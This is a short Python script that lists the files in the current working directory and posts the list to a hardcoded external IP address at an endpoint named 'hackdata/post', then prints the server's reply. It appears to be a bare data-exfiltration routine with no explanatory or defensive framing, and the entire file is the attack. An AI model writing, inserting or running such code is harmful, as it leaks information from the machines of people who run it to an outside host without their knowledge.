import os
import requests

path = os.getcwd()
#print(path)
filelist = str(os.listdir(path))
#print(filelist)

APIURL = 'http://104.248.39.146:8888/hackdata/post'

data = {"source":"srn","data":filelist}

r = requests.post(url=APIURL, data=data)
print(r.text)
print(r.status_code)